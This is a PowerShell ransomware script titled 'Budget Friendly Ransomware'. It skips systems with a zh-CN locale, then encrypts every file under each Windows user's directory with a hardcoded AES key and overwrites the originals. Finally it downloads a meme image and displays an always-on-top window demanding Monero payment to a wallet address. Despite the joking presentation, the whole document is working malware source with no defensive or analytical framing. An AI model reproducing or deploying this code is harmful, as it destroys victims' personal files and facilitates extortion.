$language = [System.Globalization.CultureInfo]::CurrentCulture
if ($language.Name -eq "zh-CN") {
    exit
}
$base64Key = "AatN58YdomB+dm/PhpPH37/xwPLACPe5Uux1R3hoQDA="
$base64IV = "fokodaUsWaO1iDBrE8MfvQ=="
$key = [System.Convert]::FromBase64String($base64Key)
$iv = [System.Convert]::FromBase64String($base64IV)

function Encrypt-File {
    param (
        [string]$filePath,
        [byte[]]$key,
        [byte[]]$iv
    )

    try {
        $content = [System.IO.File]::ReadAllBytes($filePath)

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Encrypt the content
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)

        # Delete the original file
        Remove-Item $filePath -Force

        # Write encrypted content to the same file
        [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)

        Write-Host "Encrypted: $filePath"
    }
    catch {
        # Log any errors to the error log
        $errorMessage = "Failed to encrypt: $filePath - Error: $_"
        $errorMessage | Out-File -FilePath "C:\EncryptionErrors\error_log.txt" -Append
    }
}

$logFolderPath = "C:\EncryptionErrors"
if (-not (Test-Path -Path $logFolderPath)) {
    New-Item -Path $logFolderPath -ItemType Directory
}

$usersDirectory = "C:\Users"

$excludedDirectories = @('Public', 'Default', 'Default User', 'All Users')

$validUserDirectories = Get-ChildItem -Path $usersDirectory | Where-Object {
    $_.PSIsContainer -and
    $_.Name -notin $excludedDirectories
}

# Encrypt files in each user directory
foreach ($userDir in $validUserDirectories) {
    Write-Host "Encrypting files in user directory: $($userDir.FullName)"

    $files = Get-ChildItem -Path $userDir.FullName -Recurse -File

    foreach ($file in $files) {
        try {
            Encrypt-File -filePath $file.FullName -key $key -iv $iv
        } catch {
            $errorMessage = "Failed to process: $($file.FullName) - Error: $_"
            $errorMessage | Out-File -FilePath "C:\EncryptionErrors\error_log.txt" -Append
        }
    }
}

Write-Host "Encryption completed."

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Budget Friendly Ransomware"
$form.Size = New-Object System.Drawing.Size(1600, 300)
$form.StartPosition = "CenterScreen"

Invoke-WebRequest -Uri "https://i.imgflip.com/51844q.jpg" -OutFile "$([Environment]::GetFolderPath('Desktop'))\shrek_ran.jpg"
$filePath = Join-Path $([Environment]::GetFolderPath('Desktop')) "shrek_ran.jpg"
$backgroundImage = [System.Drawing.Image]::FromFile($filePath)
$form.BackgroundImage = $backgroundImage
$form.BackgroundImageLayout = "Stretch"

$label1 = New-Object System.Windows.Forms.Label
$label1.Text = "Your personal files have been encrypted. Pay at this wallet:"
$label1.AutoSize = $true
$label1.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
$label1.BackColor = [System.Drawing.Color]::Transparent  # Transparent background
$label1.ForeColor = [System.Drawing.Color]::White        # White text color
$label1.Location = New-Object System.Drawing.Point(100, 50)

$form.Controls.Add($label1)


$label2 = New-Object System.Windows.Forms.Label
$label2.Text = "48zVtNa8KmB2G5UrN6XB9VtPaX6Vc7J5Hx7fA9sK29Ge3MQzVcU2rF89yHXG7yV8tUCJXjLk5tYaHr8U4VqPyQpX5d9mTgqAxPbc6Qs49UJW4P3nGR7d"
$label2.AutoSize = $true
$label2.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
$label2.BackColor = [System.Drawing.Color]::Transparent  # Transparent background
$label2.ForeColor = [System.Drawing.Color]::White        # White text color
$label2.Location = New-Object System.Drawing.Point(100, 100)

$form.Controls.Add($label2)

$label3 = New-Object System.Windows.Forms.Label
$label3.Text = "the value of 270356984 Monero coins (equivalent of 200 USD) to get your key"
$label3.AutoSize = $true
$label3.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
$label3.BackColor = [System.Drawing.Color]::Transparent  # Transparent background
$label3.ForeColor = [System.Drawing.Color]::White        # White text color
$label3.Location = New-Object System.Drawing.Point(100, 150)

$form.Controls.Add($label3)

$hyperlinkLabel = New-Object System.Windows.Forms.Label
$hyperlinkLabel.Text = "More info"
$hyperlinkLabel.AutoSize = $true
$hyperlinkLabel.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Underline)
$hyperlinkLabel.BackColor = [System.Drawing.Color]::Transparent
$hyperlinkLabel.Cursor = [System.Windows.Forms.Cursors]::Hand
$hyperlinkLabel.ForeColor = [System.Drawing.Color]::Blue
$hyperlinkLabel.Location = New-Object System.Drawing.Point(100, 200)

$hyperlinkLabel.Add_Click({
    Start-Process "https://www.youtube.com/watch?v=L_jWHffIx5E"
})

$form.Controls.Add($hyperlinkLabel)

$form.Topmost = $true
$form.ShowDialog()
